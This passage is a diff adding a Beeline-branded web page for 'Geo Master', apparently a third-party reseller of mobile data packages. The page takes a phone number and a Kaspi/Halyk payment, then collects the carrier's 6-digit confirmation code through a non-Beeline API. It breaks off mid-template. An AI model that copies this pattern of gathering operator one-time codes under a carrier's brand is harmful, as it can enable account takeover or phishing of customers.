@@ -1,0 +1,871 @@
+<!doctype html>
+<html lang="kk">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Geo Master — Beeline</title>
+<meta name="description" content="Geo Master — подключение интернет-пакетов Beeline по выгодным ценам.">
+<style>
+:root{
+  --bg:#FBF8F2;
+  --panel:#FFFFFF;
+  --line:#EFE7D8;
+  --ink:#1A1A1A;
+  --ink-dim:#7A7268;
+  --yellow:#FFC94A;
+  --yellow-deep:#F5A623;
+  --black:#151515;
+  --blue:#3B82F6;
+  --green:#22B573;
+  --green-deep:#0F3D22;
+  --red:#E4572E;
+  --danger:#E4572E;
+  --danger-bg:#FDEDE8;
+  --radius:20px;
+  --display:"Space Grotesk","Segoe UI",sans-serif;
+  --body:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{-webkit-text-size-adjust:100%;}
+body{
+  min-height:100svh;
+  background:var(--bg);
+  color:var(--ink);
+  font-family:var(--body);
+  display:flex;justify-content:center;
+  padding:28px 16px 40px;
+}
+.wrap{width:100%;max-width:440px;display:flex;flex-direction:column;gap:20px;}
+.topbar{display:flex;justify-content:flex-end;}
+.langtoggle{display:flex;background:var(--panel);border:1px solid var(--line);border-radius:999px;padding:4px;gap:2px;}
+.langtoggle button{border:none;background:transparent;font:600 13px var(--body);padding:7px 14px;border-radius:999px;color:var(--ink-dim);cursor:pointer;}
+.langtoggle button.active{background:var(--yellow);color:var(--black);}
+.brand{text-align:center;display:flex;flex-direction:column;align-items:center;gap:6px;}
+.brand .mark{width:56px;height:56px;border-radius:50%;background:
+  repeating-linear-gradient(-35deg,var(--black) 0 9px,var(--yellow) 9px 18px);
+  box-shadow:0 6px 16px -6px rgba(0,0,0,.35);}
+.brand h1{font:800 30px var(--display);letter-spacing:.5px;}
+.brand .tag{display:flex;align-items:center;gap:8px;font:700 11px var(--body);letter-spacing:1.5px;color:var(--ink-dim);text-transform:uppercase;}
+.brand .tag i{width:20px;height:1px;background:var(--yellow-deep);display:block;}
+.brand .geo{font:700 16px var(--display);}
+.brand .geo b{color:var(--yellow-deep);}
+.brand .geo u{display:block;width:26px;height:2px;background:var(--black);margin:3px auto 0;text-decoration:none;}
+.back{align-self:flex-start;background:none;border:none;font:600 15px var(--body);color:var(--ink);cursor:pointer;display:flex;align-items:center;gap:6px;padding:4px 0;}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:22px;box-shadow:0 10px 30px -18px rgba(20,15,5,.25);}
+/* Parallel orders on different numbers (2026-09-07): small, non-intrusive status strip for any OTHER
+   order the client has in flight besides the one currently shown full-screen - never replaces the
+   main screen, just sits above it, updated on every poll regardless of which screen is showing. */
+#backgroundOrders{display:flex;flex-direction:column;gap:8px;margin-bottom:14px;}
+#backgroundOrders:empty{display:none;margin:0;}
+.bg-order{display:flex;align-items:center;gap:10px;background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:10px 14px;font:600 13px var(--body);}
+.bg-order .dot{width:8px;height:8px;border-radius:50%;flex:none;background:var(--yellow-deep);animation:bgPulse 1.4s ease-in-out infinite;}
+.bg-order.done .dot{background:#2fae63;animation:none;}
+.bg-order.problem .dot{background:var(--danger);animation:none;}
+.bg-order .label{color:var(--ink-dim);}
+@keyframes bgPulse{0%,100%{opacity:1;}50%{opacity:.35;}}
+.subtitle{font:600 15px var(--body);color:var(--ink-dim);text-align:center;margin-bottom:14px;}
+.pkg{display:flex;align-items:center;gap:14px;width:100%;background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:16px;cursor:pointer;text-align:left;font-family:inherit;transition:transform .12s ease,box-shadow .12s ease;}
+.pkg:active{transform:scale(.98);}
+.pkg+.pkg{margin-top:12px;}
+.pkg .icon{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;flex:none;}
+.pkg.lite .icon{background:#FFF3D6;}
+.pkg.std .icon{background:#E3EFFF;}
+.pkg .info{flex:1;}
+.pkg .name{font:800 18px var(--display);}
+.pkg .gb{font:800 15px var(--display);color:var(--ink-dim);}
+.pkg.std .gb{color:var(--blue);}
+.pkg .price{font:700 15px var(--display);background:var(--yellow);padding:8px 12px;border-radius:12px;white-space:nowrap;}
+.pkg.std .price{background:#DCEBFF;color:var(--blue);}
+.pkg .tag{position:absolute;transform:translate(-6px,-30px);background:var(--blue);color:#fff;font:700 10px var(--body);padding:3px 8px;border-radius:8px;}
+.benefits{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:20px;}
+.benefits h3{font:800 15px var(--display);margin-bottom:12px;}
+.benefits ul{list-style:none;display:flex;flex-direction:column;gap:10px;}
+.benefits li{display:flex;align-items:center;gap:10px;font:500 14px var(--body);color:var(--ink);}
+.benefits li span.e{font-size:18px;}
+label{font:700 13px var(--body);display:block;margin-bottom:8px;}
+.phoneinput{display:flex;align-items:center;border:1.5px solid var(--line);border-radius:14px;padding:14px 16px;gap:10px;}
+.phoneinput span{font:700 15px var(--display);color:var(--ink-dim);}
+.phoneinput input{border:none;outline:none;font:600 17px var(--display);flex:1;background:transparent;letter-spacing:.5px;}
+.hint{display:flex;align-items:center;gap:8px;color:var(--ink-dim);font:500 12.5px var(--body);margin-top:12px;}
+.btn{width:100%;border:none;border-radius:16px;padding:16px;font:700 16px var(--display);cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:transform .12s ease,opacity .12s ease;}
+.btn:active{transform:scale(.98);}
+.btn:disabled{opacity:.5;cursor:default;}
+.btn-primary{background:var(--yellow);color:var(--black);}
+.btn-kaspi{background:linear-gradient(135deg,#FF5B34,#E4361A);color:#fff;}
+.btn-halyk{background:linear-gradient(135deg,#0B8A3E,#075E2A);color:#fff;}
+.info-box{background:#FFF6E1;border:1px solid #FCE7B2;border-radius:16px;padding:16px;display:flex;gap:12px;align-items:flex-start;font:500 13.5px var(--body);color:#5A4A1A;}
+.info-box .ico{flex:none;width:22px;height:22px;border-radius:50%;background:var(--yellow-deep);color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;}
+.receipt{display:flex;flex-direction:column;gap:10px;margin-bottom:16px;}
+.receipt-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid var(--line);}
+.receipt-row:last-child{border-bottom:none;}
+.receipt-row .k{color:var(--ink-dim);font:500 13.5px var(--body);}
+.receipt-row .v{font:700 15px var(--display);}
+.spinner{width:64px;height:64px;border-radius:50%;border:6px solid #FCE7B2;border-top-color:var(--yellow-deep);animation:spin 1s linear infinite;margin:6px auto 18px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.center{text-align:center;}
+.icon-circle{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 16px;}
+.ok{background:#E7F7EE;color:var(--green);}
+.err{background:var(--danger-bg);color:var(--danger);}
+h2.title{font:800 22px var(--display);text-align:center;margin-bottom:6px;}
+p.desc{color:var(--ink-dim);font:500 14.5px var(--body);text-align:center;line-height:1.5;}
+.otp{display:flex;gap:8px;justify-content:center;margin:18px 0 8px;}
+.otp input{width:44px;height:56px;text-align:center;font:800 22px var(--display);border:1.5px solid var(--line);border-radius:12px;outline:none;}
+.otp input:focus{border-color:var(--yellow-deep);}
+.otp input.filled{border-color:var(--yellow-deep);background:#FFFBEF;}
+.otp input.bad{border-color:var(--danger);background:var(--danger-bg);}
+.timer{text-align:center;color:var(--ink-dim);font:500 12.5px var(--body);display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:16px;}
+.resend{background:none;border:1.5px solid var(--danger);color:var(--danger);border-radius:12px;padding:9px 14px;font:700 13px var(--body);cursor:pointer;}
+.error-banner{background:var(--danger-bg);border:1px solid #F6C9BA;color:#8A2E13;border-radius:14px;padding:12px 14px;font:600 13.5px var(--body);display:flex;gap:10px;align-items:center;margin-bottom:14px;}
+.support{background:#EAFBF2;border:1px solid #C7EFDA;border-radius:16px;padding:16px;display:flex;align-items:center;gap:14px;margin-top:6px;}
+.support .wa{width:42px;height:42px;border-radius:50%;background:var(--green);color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;flex:none;}
+.support .txt strong{display:block;font:700 14px var(--body);}
+.support .txt span{color:var(--ink-dim);font:500 12.5px var(--body);}
+.support-btn{margin-left:auto;background:var(--green);color:#fff;border:none;border-radius:12px;padding:10px 14px;font:700 13px var(--body);cursor:pointer;flex:none;}
+.trust{display:flex;justify-content:space-around;color:var(--ink-dim);font:600 11.5px var(--body);margin-top:4px;}
+.trust div{display:flex;flex-direction:column;align-items:center;gap:6px;}
+.foot{text-align:center;font:500 11.5px var(--body);color:var(--ink-dim);}
+.foot b{color:var(--ink);}
+[hidden]{display:none!important;}
+@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <div class="langtoggle" id="langToggle">
+      <button data-lang="ru">РУС</button>
+      <button data-lang="kk">ҚАЗ</button>
+    </div>
+  </div>
+  <div class="brand">
+    <div class="mark"></div>
+    <h1>BEELINE</h1>
+    <div class="tag"><i></i><span id="tSlogan">ПО ВЫГОДНЫМ ЦЕНАМ</span><i></i></div>
+    <div class="geo">GEO <b>MASTER</b><u></u></div>
+  </div>
+  <button class="back" id="backBtn" hidden>← <span id="tBack">Назад</span></button>
+  <div id="reconnectBanner" hidden style="text-align:center;font:600 12.5px var(--body);color:var(--ink-dim);padding:6px 0"><span id="tReconnect"></span></div>
+  <div id="backgroundOrders"></div>
+  <div id="screens"></div>
+</div>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+'use strict';
+const API_BASE = 'https://qwertyxyz.com/v2-staging/customer-api';
+
+const STR = {
+ ru:{
+  slogan:'ПО ВЫГОДНЫМ ЦЕНАМ', back:'Назад',
+  choose_title:'Нажмите на выбранный тариф ↓', lite:'Lite', std:'Standard', per_month:'на каждый день', best:'Выгоднее',
+  benefits_title:'✨ Преимущества', b1:'Интернет действует 30 дней', b2:'Работает даже при неоплаченном тарифе', b3:'Ваш основной тариф не изменяется', b4:'Подключение занимает всего несколько минут',
+  phone_title:'Вы выбрали тариф', phone_label:'Введите номер Beeline', phone_hint:'Укажите номер телефона для подключения выбранного тарифа.', phone_secure:'Мы гарантируем безопасность ваших данных', validity:'Срок действия', days30:'30 дней', continue:'Продолжить',
+  whatnext:'Что дальше?', step1:'Введите ваш номер Beeline', step2:'Нажмите «Продолжить»', step3:'Выберите способ оплаты', step4:'Тариф будет подключён после подтверждения',
+  receipt_title:'Проверьте заказ', pkg:'Выбранный пакет', to_pay:'К оплате', method:'Способ оплаты', kaspi:'Оплатить через Kaspi', halyk:'Оплатить через Halyk', no_fee:'Без комиссии',
+  checking_title:'Проверяем платёж…', checking_desc:'Обычно это занимает до 1–2 минут. Пожалуйста, подождите, не закрывайте страницу.', number:'Номер Beeline', paid:'Оплачено',
+  otp_title:'Вам выслан код подтверждения', otp_desc:'Мы отправили вам 6-значный код подтверждения.', otp_valid:'Код действителен в течение 10 минут.', otp_secret:'Не передавайте код третьим лицам.', enter_code:'Введите 6-значный код', confirm:'Подтвердить', otp_checking:'Проверяем…', resend_in:'Код можно отправить повторно через', resend:'Запросить новый код', resend_sent:'✓ Новый код отправлен, введите его ниже', wrong_code:'Код не подошёл', wrong_desc:'Проверьте введённые цифры и попробуйте снова.', attempts_left:'Осталось попыток:',
+  success_title:'Поздравляем! Начисление прошло успешно', success_sub:'Гигабайты уже подключены к вашему номеру.', gifting:'ГБ будут начислены на ваш номер', started:'Процесс подключения уже запущен. Обычно это занимает 1–5 минут.', sms:'Как только пакет будет успешно подключён, вы получите SMS-уведомление от Beeline.',
+  activating_title:'Готово! Гигабайты уже в пути', activating_desc:'Обычно подключение занимает 1–5 минут — можно закрыть страницу, мы сообщим, когда всё будет готово.',
+  bg_training:'подключается…', bg_done:'подключён ✓', bg_problem:'возникла проблема',
+  buy_again_title:'Хотите ещё пакет?', buy_again_desc:'Можно подключить дополнительный пакет — себе или на другой номер.', buy_again_btn:'Выбрать ещё пакет',
+  order_in_progress:'Один пакет уже подключается', order_in_progress_desc:'Дождитесь завершения текущего подключения (обычно 1–5 минут) — после этого сможете сразу выбрать следующий пакет.',
+  daily_limit_title:'Лимит на этот номер исчерпан', daily_limit_desc:'На этот номер сегодня уже подключали интернет-пакет. Следующее подключение будет доступно после 00:00.',
+  phone_in_progress_title:'На этот номер уже идёт подключение', phone_in_progress_desc:'Дождитесь завершения текущего подключения на этом номере — или укажите другой номер, если хотите оформить ещё один пакет параллельно.',
+  change_number_link:'Изменить', change_number_title:'Введите правильный номер', change_number_desc:'Мы отменим старый код и вышлем новый на этот номер.', change_number_btn:'Отправить новый код', change_number_cancel:'Отмена',
+  fail_title:'Активация невозможна', fail_desc:'К сожалению, подключение выбранного пакета на указанный номер сейчас невозможно. Мы уже передали ваш запрос специалисту поддержки — он свяжется с вами в ближайшее время.',
+  need_help:'Нужна помощь?', need_help_desc:'Если возникли вопросы — напишите нам, ответим быстро.', open_wa:'Написать в WhatsApp', support_sent:'Обращение отправлено ✓',
+  trust1:'Безопасно', trust2:'Быстро', trust3:'Выгодно',
+  invalid_phone:'Проверьте номер телефона', pick_kaspi_or_halyk:'Выберите способ оплаты',
+  reconnecting:'⏳ Восстанавливаем соединение…'
+ },
+ kk:{
+  slogan:'ТИІМДІ БАҒАЛАРМЕН', back:'Артқа',
+  choose_title:'Таңдалған тарифті басыңыз ↓', lite:'Lite', std:'Standard', per_month:'күн сайын', best:'Тиімдірек',
+  benefits_title:'✨ Артықшылықтар', b1:'Интернет 30 күн жарамды', b2:'Тариф төленбесе де жұмыс істейді', b3:'Негізгі тарифіңіз өзгермейді', b4:'Қосылу бірнеше минутты алады',
+  phone_title:'Сіз тарифті таңдадыңыз', phone_label:'Beeline нөмірін енгізіңіз', phone_hint:'Таңдалған тарифті қосу үшін телефон нөмірін көрсетіңіз.', phone_secure:'Деректеріңіздің қауіпсіздігіне кепілдік береміз', validity:'Жарамдылық мерзімі', days30:'30 күн', continue:'Жалғастыру',
+  whatnext:'Әрі қарай не істеу керек?', step1:'Beeline нөміріңізді енгізіңіз', step2:'«Жалғастыру» түймесін басыңыз', step3:'Төлем тәсілін таңдаңыз', step4:'Растаудан кейін тариф қосылады',
+  receipt_title:'Тапсырысты тексеріңіз', pkg:'Таңдалған пакет', to_pay:'Төлеуге', method:'Төлем тәсілі', kaspi:'Kaspi арқылы төлеу', halyk:'Halyk арқылы төлеу', no_fee:'Комиссиясыз',
+  checking_title:'Төлем тексерілуде…', checking_desc:'Әдетте бұл 1–2 минутты алады. Өтінеміз, күте тұрыңыз, бетті жаппаңыз.', number:'Beeline нөмірі', paid:'Төленді',
+  otp_title:'Сізге растау коды жіберілді', otp_desc:'Сізге 6 таңбалы растау кодын жібердік.', otp_valid:'Код 10 минут ішінде жарамды.', otp_secret:'Кодты үшінші тұлғаларға бермеңіз.', enter_code:'6 таңбалы кодты енгізіңіз', confirm:'Растау', otp_checking:'Тексерілуде…', resend_in:'Кодты қайта жіберу мүмкін болады:', resend:'Жаңа код сұрау', resend_sent:'✓ Жаңа код жіберілді, оны төменге енгізіңіз', wrong_code:'Код сәйкес келмеді', wrong_desc:'Енгізілген сандарды тексеріп, қайталап көріңіз.', attempts_left:'Қалған әрекет саны:',
+  success_title:'Құттықтаймыз! Есептеу сәтті өтті', success_sub:'Гигабайттар нөміріңізге қосылды.', gifting:'ГБ нөміріңізге есептеледі', started:'Қосылу процесі басталды. Әдетте бұл 1–5 минутты алады.', sms:'Пакет сәтті қосылған кезде Beeline-нан SMS-хабарлама аласыз.',
+  activating_title:'Дайын! Гигабайттар жолда', activating_desc:'Әдетте қосылу 1–5 минутты алады — бетті жабуға болады, дайын болғанда хабарлаймыз.',
+  bg_training:'қосылуда…', bg_done:'қосылды ✓', bg_problem:'мәселе туындады',
+  buy_again_title:'Тағы пакет керек пе?', buy_again_desc:'Қосымша пакет қоса аласыз — өзіңізге немесе басқа нөмірге.', buy_again_btn:'Тағы пакет таңдау',
+  order_in_progress:'Бір пакет қазір қосылуда', order_in_progress_desc:'Ағымдағы қосылу аяқталғанша күтіңіз (әдетте 1–5 минут) — содан кейін келесі пакетті бірден таңдай аласыз.',
+  daily_limit_title:'Бұл нөмір бойынша лимит таусылды', daily_limit_desc:'Бұл нөмірге бүгін интернет-пакет қосылған болатын. Келесі қосылым 00:00-ден кейін қолжетімді болады.',
+  phone_in_progress_title:'Бұл нөмірге қазір қосылу жүріп жатыр', phone_in_progress_desc:'Осы нөмірдегі ағымдағы қосылу аяқталғанша күтіңіз — немесе тағы бір пакетті параллель ресімдегіңіз келсе, басқа нөмір көрсетіңіз.',
+  change_number_link:'Өзгерту', change_number_title:'Дұрыс нөмірді енгізіңіз', change_number_desc:'Ескі кодтан бас тартып, осы нөмірге жаңасын жібереміз.', change_number_btn:'Жаңа код жіберу', change_number_cancel:'Бас тарту',
+  fail_title:'Белсендіру мүмкін емес', fail_desc:'Өкінішке орай, таңдалған пакетті көрсетілген нөмірге қазір қосу мүмкін емес. Өтінішіңізді қолдау маманына жібердік — жақын арада хабарласады.',
+  need_help:'Көмек керек пе?', need_help_desc:'Сұрақтарыңыз болса — бізге жазыңыз, жылдам жауап береміз.', open_wa:'WhatsApp-қа жазу', support_sent:'Өтінім жіберілді ✓',
+  trust1:'Қауіпсіз', trust2:'Жылдам', trust3:'Тиімді',
+  invalid_phone:'Телефон нөмірін тексеріңіз', pick_kaspi_or_halyk:'Төлем тәсілін таңдаңыз',
+  reconnecting:'⏳ Байланыс қалпына келтірілуде…'
+ }
+};
+STR.ru.b_all=[STR.ru.b1,STR.ru.b2,STR.ru.b3,STR.ru.b4];
+STR.kk.b_all=[STR.kk.b1,STR.kk.b2,STR.kk.b3,STR.kk.b4];
+
+let lang = localStorage.getItem('gm_lang') || 'kk';
+let sessionToken = null;
+let ctx = null;
+let stack = [];
+let pendingOtpAttempts = 3;
+let selectedMethod = null;
+// Live-run UX fix (2026-09-04): the site must work fully standalone, not only when opened via a
+// WhatsApp/Telegram link (see initSession). This flag is what lets the ACTIVE state mean two
+// different things correctly: "just finished an order in THIS page load" (show the success screen)
+// vs "returning later / a fresh load with an already-ACTIVE account" (go straight to packages, ready
+// to order again) - the backend alone can't tell these apart, clientState is ACTIVE either way.
+let engagedThisSession = false;
+
+function t(k){return (STR[lang]&&STR[lang][k]) || STR.ru[k] || k;}
+function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+function money(n){return new Intl.NumberFormat('ru-RU').format(n);}
+
+// Phone input mask (2026-09-04): people paste their number from WhatsApp in every shape imaginable -
+// with the leading 8 Kazakhstan habit ("8777..."), with a + ("+7777..."), or just the bare local part
+// with no country code at all - so any run of 11 digits starting with 7 or 8 is treated as "country
+// code included" and that leading digit is dropped, rather than making someone hunt for a stray digit
+// to delete by hand. Capped at exactly 10 local digits either way.
+function normalizePhoneDigits(raw){
+ let digits = String(raw||'').replace(/\D/g,'');
+ if(digits.length===11 && (digits[0]==='7'||digits[0]==='8')) digits = digits.slice(1);
+ return digits.slice(0,10);
+}
+function formatPhoneDigits(digits){
+ return[digits.slice(0,3),digits.slice(3,6),digits.slice(6,8),digits.slice(8,10)].filter(Boolean).join('-');
+}
+// The +7 prefix is its own static <span> next to the input (see the .phoneinput markup) - this only
+// ever formats the 10 local digits, always fully re-derived from normalizePhoneDigits() so a mid-
+// paste of an 11-digit number reformats correctly instead of just capping at 10 raw characters.
+function bindPhoneMask(input){
+ input.addEventListener('input', ()=>{ input.value = formatPhoneDigits(normalizePhoneDigits(input.value)); });
+}
+
+function applyLang(){
+ document.documentElement.lang = lang;
+ document.getElementById('tSlogan').textContent = t('slogan');
+ document.getElementById('tBack').textContent = t('back');
+ document.getElementById('tReconnect').textContent = t('reconnecting');
+ document.querySelectorAll('#langToggle button').forEach(b=>b.classList.toggle('active', b.dataset.lang===lang));
+}
+document.getElementById('langToggle').addEventListener('click', e=>{
+ const btn = e.target.closest('button'); if(!btn) return;
+ lang = btn.dataset.lang; localStorage.setItem('gm_lang', lang); applyLang();
+ api('/language', {language:lang}).catch(()=>{});
+ render();
+});
+
+async function api(path, body, method){
+ const opts = {method: method || (body!==undefined?'POST':'GET'), headers:{'content-type':'application/json'}};
+ if(sessionToken) opts.headers.authorization = 'Bearer ' + sessionToken;
+ if(body!==undefined) opts.body = JSON.stringify(body);
+ const r = await fetch(API_BASE + path, opts);
+ const j = await r.json().catch(()=>({}));
+ if(!r.ok) throw Object.assign(new Error(j.error||'REQUEST_FAILED'), {code:j.error, status:r.status});
+ return j;
+}
+
+async function initSession(){
+ const tg = window.Telegram && window.Telegram.WebApp;
+ let body;
+ if(tg && tg.initData){
+  tg.ready(); tg.expand();
+  body = {initData: tg.initData, language: lang};
+ } else {
+  const params = new URLSearchParams(location.search);
+  const token = params.get('t');
+  if(token){ body = {token, language: lang}; }
+  else{
+   // Live-run UX fix (2026-09-04): a bare visit (no WhatsApp/Telegram link at all) is now a fully
+   // supported, standalone entry point - not an error. First time, there's no stored webId yet, so
+   // the backend mints one and hands it back (see the res.webId branch below); every later visit from
+   // this same browser sends it back and resumes the same account.
+   const webId = localStorage.getItem('gm_web_id');
+   body = webId ? {webId, language: lang} : {language: lang};
+  }
+ }
+ try{
+  const res = await api('/session', body);
+  if(res.paused){ showScreen('paused', {message:res.message}); return; }
+  if(res.webId) localStorage.setItem('gm_web_id', res.webId);
+  sessionToken = res.sessionToken; ctx = res.context;
+  if(ctx.client && ctx.client.language) { lang = ctx.client.language; localStorage.setItem('gm_lang', lang); applyLang(); }
+  render();
+ }catch(e){ showScreen('noEntry'); }
+}
+
+async function refreshContext(){ ctx = await api('/status', undefined, 'GET'); }
+
+// Parallel orders on different numbers (2026-09-07): the client is freed back to ACTIVE as soon as an
+// order's training STARTS (not once it finishes - see backend TrainingEventHandler), so client.state
+// alone can no longer tell this browser "is the order I just bought still going". This browser
+// remembers which orderId it's watching; ctx.orders (order/job-status, independent of client.state)
+// tells us whether that specific order is still genuinely in flight.
+function rememberWatchedOrder(orderId){ localStorage.setItem('gm_watching_order', orderId); }
+function watchedOrderId(){ return localStorage.getItem('gm_watching_order'); }
+function forgetWatchedOrder(){ localStorage.removeItem('gm_watching_order'); }
+
+// Renders every order in ctx.orders EXCEPT the one currently shown full-screen (watchedOrderId) as a
+// small, non-intrusive status strip - never replaces the main screen. A background order that finishes
+// successfully simply drops out of ctx.orders (COMPLETED is terminal server-side) rather than lingering
+// here - the customer already gets the real outcome via the existing WhatsApp/Telegram notification.
+function renderBackgroundOrders(){
+ const el = document.getElementById('backgroundOrders');
+ if(!el) return;
+ if(!ctx || !Array.isArray(ctx.orders) || !ctx.orders.length){ el.innerHTML = ''; return; }
+ const mine = watchedOrderId();
+ const others = ctx.orders.filter(o => o.orderId !== mine);
+ if(!others.length){ el.innerHTML = ''; return; }
+ const PROBLEM_ORDER = ['TRAINING_FAILED','PAYMENT_FAILED','AUTH_FAILED','MANUAL_REVIEW'];
+ const PROBLEM_JOB = ['FAILED','CANCELLED'];
+ el.innerHTML = others.map(o => {
+  const pkg = (ctx.availablePackages||[]).find(p => p.id === o.packageId);
+  const gb = pkg ? `${pkg.trafficGb} ГБ` : (o.packageId || '');
+  const isProblem = PROBLEM_ORDER.includes(o.orderStatus) || PROBLEM_JOB.includes(o.jobStatus);
+  return `<div class="bg-order ${isProblem?'problem':'training'}"><span class="dot"></span><span>${esc(gb)}</span><span class="label">${esc(isProblem?t('bg_problem'):t('bg_training'))}</span></div>`;
+ }).join('');
+}
+
+function screensEl(){ return document.getElementById('screens'); }
+function setBack(show, handler){
+ const b = document.getElementById('backBtn');
+ b.hidden = !show;
+ b.onclick = handler || null;
+}
+
+function render(){
+ if(!ctx) return;
+ renderBackgroundOrders();
+ const state = ctx.clientState;
+ if(['NEW','CHOOSING_PACKAGE'].includes(state)) return showScreen('packages');
+ if(state==='WAITING_PHONE'){ engagedThisSession=true; return showScreen('phone'); }
+ if(state==='WAITING_PAYMENT'){ engagedThisSession=true; return showScreen('receipt'); }
+ if(state==='PAYMENT_CONFIRMED'){ engagedThisSession=true; return showScreen('checking'); }
+ if(state==='WAITING_OTP'){ engagedThisSession=true; return showScreen('otp'); }
+ if(['TRAINING','PROVISIONING'].includes(state)){ engagedThisSession=true; return showScreen('activating'); }
+ // ACTIVE/COMPLETED means "free to act, nothing pending" on the backend either way - engagedThisSession
+ // is what tells apart "I was just watching this order finish" (success screen) from "fresh page load,
+ // ready to order again" (packages screen) - see its own comment above.
+ if(['ACTIVE','COMPLETED'].includes(state)){
+  // Parallel orders on different numbers (2026-09-07): client.state now reads ACTIVE the instant
+  // training STARTS, not once it finishes (the client is freed early so a second, different-numbered
+  // order can begin) - so ACTIVE no longer means "this order is done". If the order THIS browser is
+  // watching is still in ctx.orders (still genuinely PAID/TRAINING/PROVISIONING/etc), keep showing the
+  // activating screen for it instead of jumping to success/packages early. Once the customer explicitly
+  // starts a second order (clientState moves to WAITING_PHONE etc. above), this branch is never reached
+  // for it again - the old order simply continues as a background card instead.
+  // orders.listActiveOrders (what ctx.orders is built from) only excludes COMPLETED/FAILED/CANCELLED -
+  // a TRAINING_FAILED/PAYMENT_FAILED/AUTH_FAILED/MANUAL_REVIEW order is NOT terminal by that narrower
+  // definition (it's still useful for background-card display), so it can stay in ctx.orders
+  // indefinitely - must check the entry's OWN status here, or a genuinely failed watched order would
+  // show "activating" forever instead of ever reaching the failed screen.
+  const FAILURE_STATUSES=['TRAINING_FAILED','PAYMENT_FAILED','AUTH_FAILED','MANUAL_REVIEW','CANCELLED'];
+  const mine = watchedOrderId();
+  const mineEntry = mine && Array.isArray(ctx.orders) ? ctx.orders.find(o => o.orderId === mine) : null;
+  if(mineEntry){
+   engagedThisSession = true;
+   if(FAILURE_STATUSES.includes(mineEntry.orderStatus)){ forgetWatchedOrder(); return showScreen('failed'); }
+   return showScreen('activating');
+  }
+  if(!engagedThisSession) return showScreen('packages');
+  // Live-run forensic fix (2026-09-04): a real training failure moves the client TRAINING_FAILED->
+  // ACTIVE in one backend transaction (the client must never be left stuck) - so by the time this
+  // poll lands, clientState already reads ACTIVE exactly like a genuine success does. Confirmed live:
+  // a customer saw "всё круто" for an order support was paged about as failed, in the same instant.
+  // ctx.lastOrder (the client's most recent order, any status) is the real signal - never clientState
+  // alone - for which of the two screens below this actually was.
+  const failed = ctx.lastOrder && FAILURE_STATUSES.includes(ctx.lastOrder.status);
+  forgetWatchedOrder();
+  return showScreen(failed ? 'failed' : 'success');
+ }
+ if(['TRAINING_FAILED','PAYMENT_FAILED','AUTH_FAILED','MANUAL_REVIEW'].includes(state)){ engagedThisSession=true; return showScreen('failed'); }
+ return showScreen('packages');
+}
+
+let pollTimer = null;
+function stopPoll(){ if(pollTimer){ clearInterval(pollTimer); pollTimer = null; } document.getElementById('reconnectBanner').hidden = true; }
+// Live-run resilience fix (2026-09-04): a poll failure used to be swallowed completely silently -
+// during a brief staging deploy restart (routine while iterating on backend fixes) the screen simply
+// froze with zero feedback until the customer manually refreshed. Three consecutive misses (~10s)
+// now shows a small "reconnecting" hint instead of nothing; it clears itself the moment a poll
+// succeeds again. This never touches which screen renders - only whether this hint is visible.
+let pollFailures = 0;
+function startPoll(){
+ stopPoll();
+ pollFailures = 0;
+ pollTimer = setInterval(async ()=>{
+  try{ await refreshContext(); pollFailures = 0; document.getElementById('reconnectBanner').hidden = true; render(); }
+  catch(e){ pollFailures++; if(pollFailures>=3) document.getElementById('reconnectBanner').hidden = false; }
+ }, 3500);
+}
+
+function showScreen(name, extra){
+ stopPoll();
+ setBack(false);
+ // Owner request (2026-09-06): the BEELINE/GEO MASTER brand block is fine on the first (package
+ // choice) screen but eats useful space on every screen after it - hidden everywhere except there.
+ document.querySelector('.brand').hidden = (name !== 'packages');
+ const el = screensEl();
+ if(name==='noEntry') el.innerHTML = tplMessage(lang==='kk'?'Байланыс орнатылмады':'Не удалось подключиться', lang==='kk' ? 'Интернет байланысын тексеріп, бетті қайта жүктеңіз.' : 'Проверьте интернет-соединение и обновите страницу.', 'err', '⚠️');
+ else if(name==='paused') el.innerHTML = tplMessage(t('fail_title'), (extra&&extra.message) || '', 'err', '⏸');
+ else if(name==='packages') renderPackages(el);
+ else if(name==='phone') renderPhone(el);
+ else if(name==='receipt') renderReceipt(el);
+ else if(name==='checking') renderChecking(el);
+ else if(name==='otp') renderOtp(el);
+ else if(name==='activating') renderActivating(el);
+ else if(name==='success') renderSuccess(el);
+ else if(name==='failed') renderFailed(el);
+ // Parallel orders on different numbers (2026-09-07): keep polling on EVERY screen, not just
+ // checking/activating, as long as this client has any order still in flight (ctx.orders) - otherwise
+ // a background order's progress (and the small status strip above the screen) would freeze the
+ // moment the customer navigates away to start a second purchase.
+ if(name==='checking' || name==='activating' || (ctx && Array.isArray(ctx.orders) && ctx.orders.length)) startPoll();
+}
+
+function tplMessage(title, desc, cls, emoji){
+ return `<div class="card center"><div class="icon-circle ${cls==='err'?'err':'ok'}">${emoji}</div><h2 class="title">${esc(title)}</h2><p class="desc">${esc(desc)}</p></div>`;
+}
+
+// A support ticket is always created automatically (bindSupport() calls POST /support, which is
+// createSupportEscalation - the exact same mechanism WhatsApp already used, just reached from the
+// site now) - these two links are a direct, personal fallback contact method on top of that ticket,
+// not a replacement for it.
+function supportBlock(){
+ return `<div class="support">
+  <div class="wa">🆘</div>
